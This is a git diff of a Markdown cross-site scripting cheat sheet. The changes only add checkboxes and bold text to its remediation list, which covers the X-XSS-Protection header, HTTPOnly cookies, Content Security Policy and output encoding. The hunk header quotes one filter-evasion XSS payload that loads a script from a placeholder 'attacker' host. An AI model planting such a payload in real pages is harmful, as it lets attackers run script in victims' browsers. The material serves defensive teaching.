@@ -76,7 +76,7 @@ http://example/?var=<SRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
 
 ## XSS - Remediation     
 ### Server-Side validation
-1. [x] X-XSS-Protection
+1. [x] ***X-XSS-Protection***
 ```
 X-XSS-Protection: 0
 X-XSS-Protection: 1
@@ -88,19 +88,19 @@ X-XSS-Protection: 1; report=<reporting-uri>
 - ***1;mode=block***	xss filter enabled and prevented rendering the page if attack detected
 - ***1;report=http://example.com/report_URI***	xss filter enabled and reported the violation if attack detected
 
-2. Use HTTPOnly cookie flag: `Set-Cookie: key=123081792183asjgdhasd; HTTPOnly`
+2. [x] Use ***HTTPOnly*** cookie flag: `Set-Cookie: key=123081792183asjgdhasd; HTTPOnly`
 
-3. Implement Content Security Policy: `Content-Security-Policy: default-src: 'self'; script-src: 'self' static.domain.tld`
+3. [x] Implement ***Content Security Policy***: `Content-Security-Policy: default-src: 'self'; script-src: 'self' static.domain.tld`
 It's a browser side mechanism which allows you to create source allow lists for client side resources of your web application, e.g. JavaScript, CSS, images, etc. CSP via special HTTP header instructs the browser to only execute or render resources from those sources
 
 ***Refrence:*** https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection
 
 ### Client(Application)/Server side validation
 
-1. HTML Encode Before Inserting Untrusted Data into HTML Element Content: `<body>...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE.</body>`
-2. Attribute Encode Before Inserting Untrusted Data into HTML Common Attributes: `<div attr="...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE.">content`
-3. JavaScript Encode Before Inserting Untrusted Data into JavaScript Data Values: `<script>alert('...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE.')</script>'
-4. URL Encode Before Inserting Untrusted Data into HTML URL Parameter Values:`<a href="http://www.website.com?test=ENCODE UNTRUSTED DATA BEFORE PUTTING HERE">link</a>
+1. [x] HTML Encode Before Inserting Untrusted Data into HTML Element Content: `<body>...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE.</body>`
+2. [x] Attribute Encode Before Inserting Untrusted Data into HTML Common Attributes: `<div attr="...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE.">content`
+3. [x] JavaScript Encode Before Inserting Untrusted Data into JavaScript Data Values: `<script>alert('...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE.')</script>'
+4. [x] URL Encode Before Inserting Untrusted Data into HTML URL Parameter Values:`<a href="http://www.website.com?test=ENCODE UNTRUSTED DATA BEFORE PUTTING HERE">link</a>
 `(when you want to put untrusted data into HTTP GET parameter value)
 
 
